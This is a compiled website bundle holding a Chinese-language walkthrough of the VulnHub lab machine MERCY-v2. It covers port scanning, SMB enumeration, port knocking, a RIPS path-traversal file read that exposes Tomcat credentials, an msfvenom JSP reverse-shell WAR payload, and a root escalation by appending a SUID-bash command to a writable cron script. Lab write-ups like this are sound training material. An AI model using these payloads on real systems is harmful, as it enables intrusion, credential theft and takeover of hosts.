"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2920],{25909:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/MERCY-v2","title":"MERCY-v2","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/MERCY-v2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/MERCY-v2","permalink":"/docs/VulnHub/Virtual Machines/MERCY-v2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/MERCY-v2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Kioptrix2014","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix2014"},"next":{"title":"Machine-Writeup-Template","permalink":"/docs/VulnHub/Virtual Machines/Machine-Writeup-Template"}}');var t=r(74848),i=r(28453);const o={},a=void 0,c={},l=[{value:"port scan",id:"port-scan",level:2},{value:"enum",id:"enum",level:2},{value:"web 8080\u7aef\u53e3",id:"web-8080\u7aef\u53e3",level:2},{value:"smb",id:"smb",level:2},{value:"web 80",id:"web-80",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function p(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Feb  2 01:21:07 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.28.20\r\nNmap scan report for 192.168.28.20 (192.168.28.20)\r\nHost is up (0.0026s latency).\r\nNot shown: 65527 closed tcp ports (conn-refused)\r\nPORT     STATE SERVICE\r\n53/tcp   open  domain\r\n110/tcp  open  pop3\r\n139/tcp  open  netbios-ssn\r\n143/tcp  open  imap\r\n445/tcp  open  microsoft-ds\r\n993/tcp  open  imaps\r\n995/tcp  open  pop3s\r\n8080/tcp open  http-proxy\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'# Nmap 7.94SVN scan initiated Sun Feb  2 01:21:47 2025 as: nmap -p53,110,139,143,445,993,995,8080 -sVC -O -oN nmap_result/detils 192.168.28.20\r\nNmap scan report for 192.168.28.20 (192.168.28.20)\r\nHost is up (0.00063s latency).\r\n\r\nPORT     STATE SERVICE     VERSION\r\n53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)\r\n| dns-nsid: \r\n|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu\r\n110/tcp  open  pop3\r\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\r\n| Not valid before: 2018-08-24T13:22:55\r\n|_Not valid after:  2028-08-23T13:22:55\r\n|_pop3-capabilities: SASL AUTH-RESP-CODE STLS RESP-CODES PIPELINING TOP CAPA UIDL\r\n| fingerprint-strings: \r\n|   TerminalServer: \r\n|_    +OK Dovecot (Ubuntu) ready.\r\n|_ssl-date: TLS randomness does not represent time\r\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n143/tcp  open  imap        Dovecot imapd\r\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\r\n| Not valid before: 2018-08-24T13:22:55\r\n|_Not valid after:  2028-08-23T13:22:55\r\n|_ssl-date: TLS randomness does not represent time\r\n|_imap-capabilities: more STARTTLS LOGINDISABLEDA0001 LOGIN-REFERRALS ENABLE capabilities listed ID IDLE post-login OK Pre-login IMAP4rev1 SASL-IR LITERAL+ have\r\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\r\n993/tcp  open  ssl/imap    Dovecot imapd\r\n|_ssl-date: TLS randomness does not represent time\r\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\r\n| Not valid before: 2018-08-24T13:22:55\r\n|_Not valid after:  2028-08-23T13:22:55\r\n|_imap-capabilities: more capabilities ID ENABLE Pre-login listed AUTH=PLAINA0001 IDLE post-login OK IMAP4rev1 LOGIN-REFERRALS SASL-IR LITERAL+ have\r\n995/tcp  open  ssl/pop3\r\n|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES PIPELINING TOP CAPA UIDL\r\n| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server\r\n| Not valid before: 2018-08-24T13:22:55\r\n|_Not valid after:  2028-08-23T13:22:55\r\n|_ssl-date: TLS randomness does not represent time\r\n| fingerprint-strings: \r\n|   SIPOptions: \r\n|_    +OK Dovecot (Ubuntu) ready.\r\n8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\r\n| http-robots.txt: 1 disallowed entry \r\n|_/tryharder/tryharder\r\n| http-methods: \r\n|_  Potentially risky methods: PUT DELETE\r\n|_http-title: Apache Tomcat\r\n|_http-server-header: Apache-Coyote/1.1\r\n|_http-open-proxy: Proxy might be redirecting requests\r\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\r\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\r\nSF-Port110-TCP:V=7.94SVN%I=7%D=2/2%Time=679F0F6F%P=x86_64-pc-linux-gnu%r(T\r\nSF:erminalServer,1D,"\\+OK\\x20Dovecot\\x20\\(Ubuntu\\)\\x20ready\\.\\r\\n");\r\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\r\nSF-Port995-TCP:V=7.94SVN%T=SSL%I=7%D=2/2%Time=679F0F6C%P=x86_64-pc-linux-g\r\nSF:nu%r(SIPOptions,1D,"\\+OK\\x20Dovecot\\x20\\(Ubuntu\\)\\x20ready\\.\\r\\n");\r\nMAC Address: 00:0C:29:A0:C9:CA (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nHost script results:\r\n|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)\r\n|   Computer name: mercy\r\n|   NetBIOS computer name: MERCY\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: mercy\r\n|_  System time: 2025-02-02T14:23:45+08:00\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s\r\n| smb2-time: \r\n|   date: 2025-02-02T06:23:45\r\n|_  start_date: N/A\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u5b58\u5728smb,http,pop3\u670d\u52a1"}),"\n",(0,t.jsx)(e.h2,{id:"enum",children:"enum"}),"\n",(0,t.jsx)(e.p,{children:"\u679a\u4e3esmb\u670d\u52a1"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"enum4linux -S 192.168.28.20\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"[+] Can't determine if host is part of domain or part of a workgroup\r\n\r\n\r\n =================================( Share Enumeration on 192.168.28.20 )=================================\r\n\r\n\r\n        Sharename       Type      Comment\r\n        ---------       ----      -------\r\n        print$          Disk      Printer Drivers\r\n        qiu             Disk      \r\n        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))\r\nReconnecting with SMB1 for workgroup listing.\r\n\r\n        Server               Comment\r\n        ---------            -------\r\n\r\n        Workgroup            Master\r\n        ---------            -------\r\n        WORKGROUP            MERCY\r\n\r\n[+] Attempting to map shares on 192.168.28.20\r\n\r\n//192.168.28.20/print$  Mapping: DENIED Listing: N/A Writing: N/A\r\n//192.168.28.20/qiu     Mapping: DENIED Listing: N/A Writing: N/A\r\n\r\n[E] Can't understand response:\r\n\r\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\r\n//192.168.28.20/IPC$    Mapping: N/A Listing: N/A Writing: N/A\r\nenum4linux complete on Sun Feb  2 06:38:26 2025\n"})}),"\n",(0,t.jsx)(e.h2,{id:"web-8080\u7aef\u53e3",children:"web 8080\u7aef\u53e3"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"robots.txt"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.28.20:8080/robots.txt",children:"http://192.168.28.20:8080/robots.txt"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"User-agent: *\r\nDisallow: /tryharder/tryharder\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u8bbf\u95ee",(0,t.jsx)(e.code,{children:"/tryharder/tryharder"}),",base64\u89e3\u7801"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==\n"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list."}),"\n",(0,t.jsx)(e.p,{children:'Once, we found the password "password", quite literally sticking on a post-it in front of an employee\'s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.'}),"\n",(0,t.jsx)(e.p,{children:"No fluffy bunnies for those who set insecure passwords and endanger the enterprise."}),"\n"]}),"\n",(0,t.jsxs)(e.p,{children:["\u627e\u5230\u4e00\u4e2a\u5bc6\u7801\uff1a",(0,t.jsx)(e.code,{children:"password"})]}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u5c31\u5c1d\u8bd5\u7206\u7834tomcat\u540e\u53f0\uff0c\u65e0\u679c"}),"\n",(0,t.jsx)(e.h2,{id:"smb",children:"smb"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"\u5c1d\u8bd5smb\u670d\u52a1"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/MERCY-v2]\r\n\u2514\u2500$ smbclient -U qiu //192.168.28.20/qiu\r\nPassword for [WORKGROUP\\qiu]:\r\nTry "help" to get a list of possible commands.\r\nsmb: \\> ls\r\n  .                                   D        0  Fri Aug 31 15:07:00 2018\r\n  ..                                  D        0  Mon Nov 19 11:59:09 2018\r\n  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018\r\n  .public                            DH        0  Sun Aug 26 10:23:24 2018\r\n  .bash_history                       H      163  Fri Aug 31 15:11:34 2018\r\n  .cache                             DH        0  Fri Aug 31 14:22:05 2018\r\n  .private                           DH        0  Sun Aug 26 12:35:34 2018\r\n  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018\r\n  .profile                            H      675  Sun Aug 26 09:19:34 2018\r\n\r\n                19213004 blocks of size 1024. 16326108 blocks available\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728",(0,t.jsx)(e.code,{children:".private\\opensesame"}),"\u76ee\u5f55\u53d1\u73b0\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"smb: \\.private\\opensesame\\> get config\r\nsmb: \\.private\\opensesame\\> get configprint \n"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"configprint"}),"\u4e00\u4e2ash\u811a\u672c\uff0c\u6709",(0,t.jsx)(e.code,{children:"knockd.conf"}),",",(0,t.jsx)(e.code,{children:"apache2.conf"}),",",(0,t.jsx)(e.code,{children:"smb.conf"}),"\u914d\u7f6e\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/MERCY-v2]\r\n\u2514\u2500$ cat configprint \r\n#!/bin/bash\r\n\r\necho "Here are settings for your perusal." > config\r\necho "" >> config\r\necho "Port Knocking Daemon Configuration" >> config\r\necho "" >> config\r\ncat "/etc/knockd.conf" >> config\r\necho "" >> config\r\necho "Apache2 Configuration" >> config\r\necho "" >> config\r\ncat "/etc/apache2/apache2.conf" >> config\r\necho "" >> config\r\necho "Samba Configuration" >> config\r\necho "" >> config\r\ncat "/etc/samba/smb.conf" >> config\r\necho "" >> config\r\necho "For other details of MERCY, please contact your system administrator." >> config\r\n\r\nchown qiu:qiu config\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u67e5\u770b",(0,t.jsx)(e.code,{children:"config"}),"\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202195232853.png",alt:"image-20250202195232853"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"Port Knocking Daemon Configuration\r\n\r\n[options]\r\n        UseSyslog\r\n\r\n[openHTTP]\r\n        sequence    = 159,27391,4\r\n        seq_timeout = 100\r\n        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT\r\n        tcpflags    = syn\r\n\r\n[closeHTTP]\r\n        sequence    = 4,27391,159\r\n        seq_timeout = 100\r\n        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT\r\n        tcpflags    = syn\r\n\r\n[openSSH]\r\n        sequence    = 17301,28504,9999\r\n        seq_timeout = 100\r\n        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\r\n        tcpflags    = syn\r\n\r\n[closeSSH]\r\n        sequence    = 9999,28504,17301\r\n        seq_timeout = 100\r\n        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT\r\n        tcpflags    = syn\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u6709\u4e2ahttp\u548cssh\u670d\u52a1"}),"\n",(0,t.jsx)(e.p,{children:"\u4f7f\u7528knock\u5de5\u5177"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"knock 192.168.28.20 159 27391 4 -v\r\nknock 192.168.28.20 17301 28504 9999 -v\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202195454748.png",alt:"image-20250202195454748"})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u626b\u63cf\u5168\u7aef\u53e3"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u2500\u2500(kali\u327fkali)-[~/vulnhub/MERCY-v2]\r\n\u2514\u2500$ nmap -sT --min-rate=8899 -p- 192.168.28.20 \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 06:55 EST\r\nNmap scan report for 192.168.28.20 (192.168.28.20)\r\nHost is up (0.0021s latency).\r\nNot shown: 65525 closed tcp ports (conn-refused)\r\nPORT     STATE SERVICE\r\n22/tcp   open  ssh\r\n53/tcp   open  domain\r\n80/tcp   open  http\r\n110/tcp  open  pop3\r\n139/tcp  open  netbios-ssn\r\n143/tcp  open  imap\r\n445/tcp  open  microsoft-ds\r\n993/tcp  open  imaps\r\n995/tcp  open  pop3s\r\n8080/tcp open  http-proxy\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u53d1\u73b0\u5f00\u542f\u4e86ssh\u548chttp\u670d\u52a1"}),"\n",(0,t.jsx)(e.h2,{id:"web-80",children:"web 80"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/MERCY-v2]\r\n\u2514\u2500$ dirb http://192.168.28.20\r\n-----------------\r\nDIRB v2.22    \r\nBy The Dark Raver\r\n-----------------\r\n\r\nSTART_TIME: Sun Feb  2 06:58:18 2025\r\nURL_BASE: http://192.168.28.20/\r\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\r\n\r\n-----------------\r\n\r\nGENERATED WORDS: 4612\r\n\r\n---- Scanning URL: http://192.168.28.20/ ----\r\n+ http://192.168.28.20/index.html (CODE:200|SIZE:90)\r\n+ http://192.168.28.20/robots.txt (CODE:200|SIZE:50)\r\n+ http://192.168.28.20/server-status (CODE:403|SIZE:293)\r\n+ http://192.168.28.20/time (CODE:200|SIZE:79)\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/MERCY-v2]\r\n\u2514\u2500$ curl http://192.168.28.20/time      \r\nThe system time is: Sun Feb  2 20:00:01 +08 2025.\r\nTime check courtesy of LINUX\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c55\u793a\u51fa\u4e86\u5f53\u524d\u7684\u65f6\u95f4\uff0c\u8fd8\u4f1a\u66f4\u65b0\uff08\u53ef\u80fd\u5b58\u5728\u5b9a\u65f6\u4efb\u52a1\uff09"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202200214592.png",alt:"image-20250202200214592"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"rips 0.53"})}),"\n",(0,t.jsx)(e.p,{children:"\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"searchsploit RIPS -m 18660\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"File: /windows/code.php\r\n=======================\r\n\r\n102: file $lines = file($file);\r\n    96: $file = $_GET['file'];\r\n\r\nPoC:\r\nhttp://localhost/rips/windows/code.php?file=../../../../../../etc/passwd\r\n\r\nFile: /windows/function.php\r\n===========================\r\n\r\n    64: file $lines = file($file);\r\n        58: $file = $_GET['file'];\r\n\r\nPoC:\r\nhttp://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will\r\nread the first line of the file)\n"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.28.20/nomercy/windows/code.php?file=../../../../../../etc/passwd",children:"http://192.168.28.20/nomercy/windows/code.php?file=../../../../../../etc/passwd"})}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202200440664.png",alt:"image-20250202200440664"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u5305\u542b",(0,t.jsx)(e.code,{children:"/var/log/mail.log"}),",",(0,t.jsx)(e.code,{children:"/var/log/apache2/access.log"}),"\uff0c\u65e0\u679c\uff08\u5e94\u8be5\u662f\u6743\u9650\u95ee\u9898\uff09"]}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u5305\u542b",(0,t.jsx)(e.code,{children:"/etc/tomcat7/tomcat-users.xml"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202201140105.png",alt:"image-20250202201140105"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'<role rolename="admin-gui"/>\r\n<role rolename="manager-gui"/>\r\n<user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/> \r\n<user username="fluffy" password="freakishfluffybunny" roles="none"/>\r\n</tomcat-users> \n'})}),"\n",(0,t.jsx)(e.p,{children:"\u4e24\u5bf9\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"thisisasuperduperlonguser:heartbreakisinevitable\r\nfluffy:freakishfluffybunny\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u767b\u5f55\u540e\uff0cwar\u5305\u90e8\u7f72\u5373\u53ef"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.28.20 LPORT=1234 -f war > shell.war\n"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.28.20:8080/shell/",children:"http://192.168.28.20:8080/shell/"})}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u53cd\u5f39shell"}),"\n",(0,t.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsxs)(e.p,{children:["\u5207\u6362",(0,t.jsx)(e.code,{children:"fluffy"}),"\u7528\u6237\uff0c",(0,t.jsx)(e.code,{children:"/home/fluffy/.private/secrets"}),"\u76ee\u5f55\u53d1\u73b0",(0,t.jsx)(e.code,{children:"timeclock"}),"\u811a\u672c"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'$ ls -la\r\nls -la\r\ntotal 20\r\ndrwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .\r\ndrwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..\r\n-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save\r\n-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets\r\n-rwxrwxrwx 1 root   root    264 Feb  2 15:51 timeclock\r\n$ cat timeclock\r\ncat timeclock\r\n#!/bin/bash\r\n\r\nnow=$(date)\r\necho "The system time is: $now." > ../../../../../var/www/html/time\r\necho "Time check courtesy of LINUX" >> ../../../../../var/www/html/time\r\nchown www-data:www-data ../../../../../var/www/html/time\n'})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" >> timeclock\n'})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"$ cd /tmp\r\n$ ls\r\nbash  hsperfdata_tomcat7  tomcat7-tomcat7-tmp\r\n$ ./bash -p\r\nbash-4.3# whoami\r\nroot\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"bash-4.3# cat proof.txt\r\nCongratulations on rooting MERCY. :-)\n"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(p,{...n})}):p(n)}},28453:(n,e,r)=>{r.d(e,{R:()=>o,x:()=>a});var s=r(96540);const t={},i=s.createContext(t);function o(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:o(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);